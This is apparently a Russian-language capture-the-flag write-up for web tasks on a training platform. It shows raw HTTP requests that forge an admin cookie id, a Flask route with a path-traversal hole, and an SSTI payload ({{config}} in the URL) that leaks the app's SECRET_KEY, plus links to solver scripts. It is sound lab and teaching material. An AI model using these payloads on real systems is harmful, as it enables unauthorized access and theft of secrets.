### Writeup`s WEB:
___

#### Банка для печенья :cookie:: 
<details><summary></summary>
Нас встречает следующее описание: 
>"Что ж, цель - стать админом!"

Переходим на 62.173.140.174:16003. Что у нас есть:
* Известно количество пользователей -128
* Наш id

Вероятнее всего от нас хотят, чтобы мы получили id админа. Как правило id админа это или 1,или 0.
Заходим в BurpSuite, отправляем запрос на сайт:

```
GET / HTTP/1.1
Host: 62.173.140.174:16003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
Получаем ответ:
```
HTTP/1.1 200 OK
date: Mon, 17 Apr 2023 06:32:11 GMT
server: uvicorn
content-length: 204
content-type: text/plain; charset=utf-8
set-cookie: id=107; Path=/; SameSite=lax
Connection: close

Привет! Я написал небольшое приложение рассчитанное на 128 пользователей. Твоя цель - стать админом.

Твой айди: 107
```
Видим header http запроса:
```
set-cookie: id=107; Path=/`
```
Попробуем в тело первого запроса установить header "Cookie: id=1"

```
GET / HTTP/1.1
Host: 62.173.140.174:16003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
Получаем ответ:
```
HTTP/1.1 200 OK
date: Mon, 17 Apr 2023 06:35:27 GMT
server: uvicorn
content-length: 202
content-type: text/plain; charset=utf-8
Connection: close

Привет! Я написал небольшое приложение рассчитанное на 128 пользователей. Твоя цель - стать админом.

Твой айди: 1
```
Как видим, флага нет, аналогично с id=0. Что ж, вероятнее всего придется брутить все 128 id, так как пользователей всего 128.
Чтобы не делать этого в ручную [(resolved) Банка для печенья.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%91%D0%B0%D0%BD%D0%BA%D0%B0%20%D0%B4%D0%BB%D1%8F%20%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D1%8C%D1%8F.py)
</details>

#### Обычная страница :newspaper::

<details><summary></summary>

Итак:
>"Решил попрактиковаться в написании приложений на Flask-e. Флаг лежит по пути "/flag.txt" :D"

Изначально из описания: "Флаг лежит по пути "/flag.txt" :D" можно предположить, что мы имеем дело с уязвимостью DirectoryTraversal

Проанализируем код, который мы видим, когда открываем страницу с заданием:
```
from flask import Flask, render_template, request, abort, send_file
from os import getcwd
from os.path import exists

app = Flask(__name__)
working_dir = getcwd()


@app.route('/')
def root():
    return render_template("index.html")


@app.route('/static')
def get_static():
    file_path = f"{working_dir}/static/{request.args.get('file')}"

    if exists(file_path):
        return send_file(file_path)
    else:
        abort(404)


def main():
    app.run()


if __name__ == '__main__':
    main()
```
Мне эти строки в коде показались подозрительными, ``` def get_static():
    file_path = f"{working_dir}/static/{request.args.get('file')}```, поэтому недолго думая, я решил эксплуатировать Directory Traversal именно там. Пример автоматизированной эксплуатации:  [(resolved) Обычная страница.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%9E%D0%B1%D1%8B%D1%87%D0%BD%D0%B0%D1%8F%20%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B8%D1%86%D0%B0.py)
</details>

#### Поздравительное приложение :birthday::
<details><summary></summary>

Начинаем с описания:
> "Сделал вот свое приложение, чтобы здороваться со всем миром. Флаг - значение SECRET_KEY в конфиге."

Замечательно, приступим к решению.
Нас встречает:
```
Hello, it's my greeting app
Example: Greeting Joe
```
Попробуем пользоваться приложением. Клацаем на ___Greeting Joe___ и попадаем на страничку  ```http://62.173.140.174:16004/joe```. Вероятнее всего здесь используются шаблоны, попробуем отправить следующий запрос ```http://62.173.140.174:16004/test```

Получаем: 
```
Hello, test!
Home
```
Неплохо, вероятнее всего это уязвим к SSTI. Пробуем payload ```http://62.173.140.174:16004/%7B%7Bconfig%7D%7D``` и вуаля! Автоматизированная эксплуатация: [(resolved) Поздравительное приложение.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%9F%D0%BE%D0%B7%D0%B4%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE%D0%B5%20%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5.py)
</details>

#### Приключение с флагом :triangular_flag_on_post::
<details><summary></summary>
Описание:

> "Я спрятал 4 части флага, попробуй их найти)"

Так, ну тот все предельно просто. Открываем консоль разработчик и приступаем к поиску:

Первую часть можно сразу увидеть в <head></head>
Вторая часть расположилась в main.js
Часть три в style.css
Ну и последняя в /robots.txt
Автоматизированное решение: [(resolved) Приключение с флагом.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%9F%D1%80%D0%B8%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5%20%D1%81%20%D1%84%D0%BB%D0%B0%D0%B3%D0%BE%D0%BC.py)

</details>

#### Разминка с JWT + Момент с JWT :closed_lock_with_key::
<details><summary></summary>
Описание разминка с JWT

> "Разминочный таск на JWT, перед таском посложнее"

Описание Момент с JWT:

> "JWT таск для настоящих ♂ Perfomance Artists ♂"

Автоматизированное решение: [(resolved) Разминка с JWT + Момент с JWT.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%A0%D0%B0%D0%B7%D0%BC%D0%B8%D0%BD%D0%BA%D0%B0%20%D1%81%20JWT%20%2B%20%20%D0%9C%D0%BE%D0%BC%D0%B5%D0%BD%D1%82%20%D1%81%20JWT.py)

</details>

#### Я не робот :robot::
<details><summary></summary>
Описание:

> "Докажи, что ты (не) робот!"

Приступим к решению: 

Анализируем, что есть:

* Captha на начальной странице
* Строка в base, из которой можно узнать условие решения capth
* Надо решить 50 раз
* В консоли разработчика можно увидеть, что используется websocket

Можно, конечно, 50 раз ручками решить капчу, но это не путь самурая, поэтому автоматизированное решение: [(resolved) Я не робот!.py](https://github.com/WNS-Team/codeby.games/blob/main/Web/(resolved)%20%D0%AF%20%D0%BD%D0%B5%20%D1%80%D0%BE%D0%B1%D0%BE%D1%82!.py)

</details>

___